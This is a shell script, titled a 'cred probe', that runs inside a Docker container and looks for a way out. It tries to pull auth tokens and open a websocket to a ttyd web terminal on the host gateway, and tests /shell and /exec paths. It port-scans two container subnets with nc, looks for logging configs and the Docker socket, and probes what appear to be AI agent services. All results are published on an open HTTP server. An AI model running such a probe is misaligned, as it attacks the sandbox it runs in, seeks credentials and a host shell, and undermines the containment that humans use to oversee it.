#!/bin/sh
echo "=== ttyd + agent cred probe v6 ===" > /app/index.html
echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /app/index.html
echo "" >> /app/index.html

echo "=== TTYD on 8080 ===" >> /app/index.html
echo "--- websocket upgrade ---" >> /app/index.html
curl -sv -m 5 "http://172.18.0.1:8080/ws" \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "--- ttyd auth endpoint ---" >> /app/index.html
curl -sv -m 5 "http://172.18.0.1:8080/auth_token.js" >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "--- ttyd token ---" >> /app/index.html
curl -sv -m 5 "http://172.18.0.1:8080/token" >> /app/index.html 2>&1
echo "" >> /app/index.html

echo "--- ttyd various paths ---" >> /app/index.html
for path in "/" "/ws" "/api" "/terminal" "/shell" "/exec"; do
  RESULT=$(curl -s -m 2 -o /dev/null -w "%{http_code}" "http://172.18.0.1:8080${path}")
  echo "8080${path} → HTTP $RESULT" >> /app/index.html
done
echo "" >> /app/index.html

echo "=== SCAN ALL DOCKER CONTAINERS ===" >> /app/index.html
echo "--- 172.18.0.x scan (docker0 bridge) ---" >> /app/index.html
for i in $(seq 1 20); do
  for port in 8000 8080 5672 9200 80 443 9100; do
    nc -z -w1 172.18.0.$i $port 2>/dev/null && echo "172.18.0.$i:$port OPEN" >> /app/index.html
  done
done
echo "" >> /app/index.html

echo "--- 172.19.0.x scan (project network) ---" >> /app/index.html
for i in $(seq 1 20); do
  for port in 8000 8080 5672 80 443; do
    nc -z -w1 172.19.0.$i $port 2>/dev/null && echo "172.19.0.$i:$port OPEN" >> /app/index.html
  done
done
echo "" >> /app/index.html

echo "=== FLUENT-BIT CONFIG (if mounted) ===" >> /app/index.html
find / -name "fluent-bit*" -o -name "fluentbit*" 2>/dev/null >> /app/index.html
echo "" >> /app/index.html

echo "=== DOCKER SOCKET ===" >> /app/index.html
ls -la /var/run/docker.sock 2>&1 >> /app/index.html
echo "" >> /app/index.html

echo "=== TRY AGENT via 172.18.0.x on :8000 ===" >> /app/index.html
for i in 2 3 4 5 6 7 8 9 10; do
  RESULT=$(curl -s -m 1 -o /dev/null -w "%{http_code}" "http://172.18.0.$i:8000/health" 2>/dev/null)
  if [ "$RESULT" != "000" ]; then
    echo "172.18.0.$i:8000/health → HTTP $RESULT" >> /app/index.html
    curl -s -m 2 "http://172.18.0.$i:8000/health" >> /app/index.html
    echo "" >> /app/index.html
  fi
done
echo "" >> /app/index.html

echo "=== done ===" >> /app/index.html
cd /app && python3 -m http.server 8080
